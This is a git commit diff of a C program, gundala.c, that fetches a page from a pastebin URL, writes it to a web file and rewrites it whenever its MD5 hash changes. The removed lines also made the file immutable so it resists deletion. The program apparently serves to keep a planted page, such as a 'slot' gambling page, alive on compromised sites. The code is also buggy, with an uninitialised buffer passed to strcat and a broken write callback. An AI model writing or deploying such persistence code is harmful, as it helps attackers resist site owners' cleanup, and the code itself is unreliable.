b983487b6ad872d2f1ea2c0478da9fcb9e0eed07
Bosen <bosen@users.noreply.github.com>
2022-04-11 11:24:09 +0700

    Update gundala.c

--- gundala.c
+++ gundala.c
@@ -2,20 +2,63 @@
 #include <stdlib.h>
 #include <string.h>
 #include <unistd.h>
-#include <errno.h>
 #include <sys/types.h>
 #include <sys/stat.h>
-#include <sys/ioctl.h>
-#include <linux/fs.h>
 #include <openssl/md5.h>
 #include <curl/curl.h>
 
 #define SRC             "https://pastebin.com/raw/eVjujdc1"
 #define SRC_MD5         "6807828dbfab3dfa1301a0cbfc497cab"
-#define TARGET_FILE     "./slot/index.html"
-#define NORM            0x00000000
+#define CONF_URL        "https://localhost/"
 
-char * calc_md5(const char *filename) {
+struct string {
+  char *ptr;
+  size_t len;
+};
+
+void init_string(struct string *s) {
+  s->len = 0;
+  s->ptr = malloc(s->len+1);
+  if (s->ptr == NULL) {
+    fprintf(stderr, "malloc() failed\n");
+    exit(EXIT_FAILURE);
+  }
+}
+
+size_t writefunc(void *ptr, size_t size, size_t nmemb, struct string *s)
+{
+  size_t new_len = s->len + size*nmemb;
+  s->ptr = realloc(s->ptr, new_len+1);
+  if (s->ptr == NULL) {
+    fprintf(stderr, "realloc() failed\n");
+    exit(EXIT_FAILURE);
+  }
+  memcpy(s->ptr+s->len, ptr, size*nmemb);
+
+  return size*nmemb;
+}
+
+void rtrim(char *src)
+{
+  size_t i, len;
+  volatile int isblank = 1;
+
+  if(src == NULL) return;
+
+  len = strlen(src);
+  if(len == 0) return;
+  for(i = len - 1; i > 0; i--) {   
+    isblank = isspace(src[i]);
+    if(isblank)
+      src[i] = 0;
+    else
+      break;
+  }   
+  if(isspace(src[i]))
+    src[i] = 0;
+}
+
+char *calc_md5(const char *filename) {
   unsigned char c[MD5_DIGEST_LENGTH];
   int i;
   MD5_CTX mdContext;
@@ -42,79 +85,64 @@ char * calc_md5(const char *filename) {
   return filemd5;
 }
 
-int restore() {
-  int new_attrs;
-  size_t fd;
-
-  CURL* easyhandle = curl_easy_init();
+int restore(char *arg) {
+  CURL *easyhandle = curl_easy_init();
   curl_easy_setopt(easyhandle, CURLOPT_URL, SRC);
   curl_easy_setopt(easyhandle, CURLOPT_HEADER, 0);
 
-  FILE* file = fopen(TARGET_FILE, "w");
-  curl_easy_setopt(easyhandle, CURLOPT_WRITEDATA, file);
-  curl_easy_perform(easyhandle);
-  curl_easy_cleanup(easyhandle);
-  
-  fclose(file);
-
-  fd = open(TARGET_FILE, 0);
-  new_attrs = FS_IMMUTABLE_FL;
-
-  if (ioctl(fd, FS_IOC_SETFLAGS, &new_attrs) == -1) {
-    fprintf(stderr, "ERROR: Unable to set flags on %s, skipping\n", TARGET_FILE);
+  FILE *file = fopen(arg, "w");
+  if (file) {
+    curl_easy_setopt(easyhandle, CURLOPT_WRITEDATA, file);
+    curl_easy_perform(easyhandle);
+    fclose(file);
   }
-
+  curl_easy_cleanup(easyhandle);
   return 0;
 }
- 
-int cekidot() {
-  if (access(TARGET_FILE, F_OK) != 0) {
-    restore();
-  } else {
-    resetattr();
-    restore();
-  }   
-  return 0; 
-}
 
-int check_md() {
-  char *new_md5 = calc_md5(TARGET_FILE);
-  if (!strcmp(SRC_MD5, new_md5)) {
-    return 0; // TODO: check config && resident?
-  } else {
-    restore();
-  }
+int check_md(char *arg) {
+  char *new_md5 = calc_md5(arg);
+  if (strcmp(SRC_MD5, new_md5)) 
+    restore(arg);
+   
   free(new_md5);
   return 0;
 }
 
-int resetattr() {
-  int current_attrs, new_attrs, mask;
-  size_t fd;
-  
-  fd = open(TARGET_FILE, 0); 
-  if (fd < 0) {
-    fprintf(stderr, "ERROR: Unable to open %s\n", TARGET_FILE);
-    exit(1);
-  }
- 
-  if (ioctl(fd, FS_IOC_GETFLAGS, &current_attrs) == -1) {
-    fprintf(stderr, "ERROR: Unable to get flags on %s\n", TARGET_FILE);
-    close(fd);
-    exit(1);
-  }
+char *readconf(char *arg) {
+  CURL *curl;
+  CURLcode res;
+  char *ret;
 
-  new_attrs = NORM; 
-  if (ioctl(fd, FS_IOC_SETFLAGS, &new_attrs) == -1) {
-    fprintf(stderr, "ERROR: Unable to set flags on %s\n", TARGET_FILE);
-    close(fd);
-    exit(1);
-  }
+  curl = curl_easy_init();
+  if (curl) {
+    struct string s;
+    init_string(&s);
 
-  close(fd);
+    curl_easy_setopt(curl, CURLOPT_URL, arg);
+    curl_easy_setopt(curl, CURLOPT_HEADER, 0);
+    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, writefunc);
+    curl_easy_setopt(curl, CURLOPT_WRITEDATA, &s);
+    res = curl_easy_perform(curl);
+    curl_easy_cleanup(curl);
+    ret = s.ptr;
+    return ret;
+  }
 }
 
-int main() {
-  cekidot();
-  check_md();
+int main(int argc, char *argv[]) {
+  char *fn, *input;
+  char self[100];
+  input = argv[0];
+
+  (fn = strrchr(input, '/')) ? ++fn : (fn = input);
+  strcat(self, CONF_URL);
+  strcat(self, fn);
+
+  input = readconf(self);
+  rtrim(input);
+  if (access(input, F_OK) != 0)
+    restore(input);
+ 
+  check_md(input);
 }
